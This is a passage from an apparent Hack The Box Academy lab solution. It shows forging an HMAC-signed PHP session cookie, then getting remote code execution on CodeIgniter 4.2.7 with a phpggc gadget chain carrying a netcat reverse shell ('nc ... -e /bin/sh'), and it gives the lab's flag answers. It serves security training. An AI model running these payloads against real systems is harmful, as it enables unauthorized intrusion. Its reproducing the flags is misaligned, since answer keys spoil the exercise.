$arr = array('id' => 'test', 'username' => 'test', 'role' => '0');
$ser = serialize($arr);

$hmac = hash_hmac("sha1", $ser, $APP_SECRET);

echo base64_encode($ser) . "." . $hmac;
EOF
```

Subsequently, students need to run the script to attain the cookie:

Code: shell

```shell
php generateCookie.php
```

```shell
┌─[eu-academy-1]─[10.10.14.162]─[htb-ac413848@htb-qmmsulophr]─[~]
└──╼ [★]$ php generateCookie.php

YTozOntzOjI6ImlkIjtzOjQ6InRlc3QiO3M6ODoidXNlcm5hbWUiO3M6NDoidGVzdCI7czo0OiJyb2xlIjtzOjE6IjAiO30=.e41d1a116f53e48cb3a24f880cb89c19be39c80a
```

Using the same previously registered account, students need to replace the `auth` cookie value with the generated one and then refresh the page, to find the flag `HTB{a9c1863ecc6775e6c5fd2597d47a1d29}`:

![[HTB Solutions/CWEE/z. images/b65c9ef93af698c02f2420cb3e2e9822_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/a2bb68634480d0c09f4eaf32a41d4e33_MD5.jpg]]

Answer: `HTB{a9c1863ecc6775e6c5fd2597d47a1d29}`

# Skills Assessment II

## Question 2

### "\[http://SERVER\_IP:8080\] Achieve remote command execution and read the flag.txt file"

From the previous question, students know that the web application utilizes the PHP framework `CodeIgniter 4.2.7`:

![[HTB Solutions/CWEE/z. images/c8a5a38d4b9a81df647c009ceff92400_MD5.jpg]]

Moreover, after accessing the admin dashboard, students have the ability to import posts:

![[HTB Solutions/CWEE/z. images/e428a4f648a32f032b3edb259367e797_MD5.jpg]]

Therefore, to achieve remote code execution, students need to use `gadget chains`. First, if `PHPGCC` is not installed, students need to clone its [repository](https://github.com/ambionics/phpggc) and change directories into it:

Code: shell

```shell
git clone https://github.com/ambionics/phpggc.git && cd phpggc/
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tihlybxmyf]─[~]
└──╼ [★]$ git clone https://github.com/ambionics/phpggc.git && cd phpggc/

Cloning into 'phpggc'...
remote: Enumerating objects: 3150, done.
remote: Counting objects: 100% (696/696), done.
remote: Compressing objects: 100% (266/266), done.
remote: Total 3150 (delta 458), reused 554 (delta 400), pack-reused 2454
Receiving objects: 100% (3150/3150), 461.88 KiB | 7.00 MiB/s, done.
Resolving deltas: 100% (1330/1330), done.
```

Students then need to make the PHP script `phpggc` executable:

Code: shell

```shell
chmod +x phpggc
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tihlybxmyf]─[~/phpggc]
└──╼ [★]$ chmod +x phpggc
```

Subsequently, students need to list the gadget chains available for `CodeIgniter`:

Code: shell

```shell
./phpggc -l CodeIgniter
```

```shell
┌─[eu-academy-1]─[10.10.14.162]─[htb-ac413848@htb-ki6dnhlkny]─[~/phpggc]
└──╼ [★]$ ./phpggc -l CodeIgniter

Gadget Chains
-------------

NAME                 VERSION                       TYPE                   VECTOR        I    
CodeIgniter4/RCE1    4.0.2 <= 4.0.3                RCE (Function call)    __destruct         
CodeIgniter4/RCE2    4.0.0-rc.4 <= 4.0.4+          RCE (Function call)    __destruct         
CodeIgniter4/RCE3    -4.1.3+                       RCE (Function call)    __destruct         
CodeIgniter4/RCE4    4.0.0-beta.1 <= 4.0.0-rc.4    RCE (Function call)    __destruct      
```

Students need to utilize `CodeIgniter4/RCE3` to call the PHP function `system` with the argument `nc -nv PWNIP PWNPO -e /bin/sh` and encode the payload to base64 with the option `-b`:

Code: shell

```shell
./phpggc CodeIgniter4/RCE3 system 'nc -nv PWNIP PWNPO -e /bin/sh' -b
```

```shell
┌─[eu-academy-1]─[10.10.14.162]─[htb-ac413848@htb-ki6dnhlkny]─[~/phpggc]
└──╼ [★]$ ./phpggc CodeIgniter4/RCE3 system 'nc -nv 10.10.14.162 9001 -e /bin/sh' -b

TzozOToiQ29kZUlnbml0ZXJcQ2FjaGVcSGFuZGxlcnNcUmVkaXNIYW5kbGVyIjoxOntzOjU6InJlZGlzIjtPOjQ1OiJDb2RlSWduaXRlclxTZXNzaW9uXEhhbmRsZXJzXE1lbWNhY2hlZEhhbmRsZXIiOjI6e3M6NzoibG9ja0tleSI7czo5OiJGaXJlYmFza3kiO3M6OToibWVtY2FjaGVkIjtPOjIwOiJGYWtlclxWYWxpZEdlbmVyYXRvciI6Mzp7czoxMjoiACoAZ2VuZXJhdG9yIjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtzOjM1OiJuYyAtbnYgMTAuMTAuMTQuMTYyIDkwMDEgLWUgL2Jpbi9zaCI7fXM6MTI6IgAqAHZhbGlkYXRvciI7czo2OiJzeXN0ZW0iO3M6MTM6IgAqAG1heFJldHJpZXMiO2k6MTt9fX0=
```

Then, students need to start an `nc` listener with the same port utilized in the reverse shell command (9001 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```shell
┌─[eu-academy-1]─[10.10.14.162]─[htb-ac413848@htb-ki6dnhlkny]─[~/phpggc]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Subsequently, within that admin dashboard the students have attained in the previous question, they need to paste the base64 payload and click "Import post":

![[HTB Solutions/CWEE/z. images/a7257b7309bd7e3c1c580cc877244ce5_MD5.jpg]]

Students will notice that the reverse shell connection has been established successfully in the `nc` listener:

```shell
Ncat: Connection from 10.129.204.98.
Ncat: Connection from 10.129.204.98:60722.
whoami

htbear
```

At last, students need to print out the contents of the flag file "flag.txt" which is one directory up from the landing directory, attaining the flag `HTB{4f35303d9497d249a01f83dd7774fb39}`:

```shell
cat ../flag.txt
```
```shell
cat ../flag.txt

HTB{4f35303d9497d249a01f83dd7774fb39}
```

Answer: `HTB{4f35303d9497d249a01f83dd7774fb39}`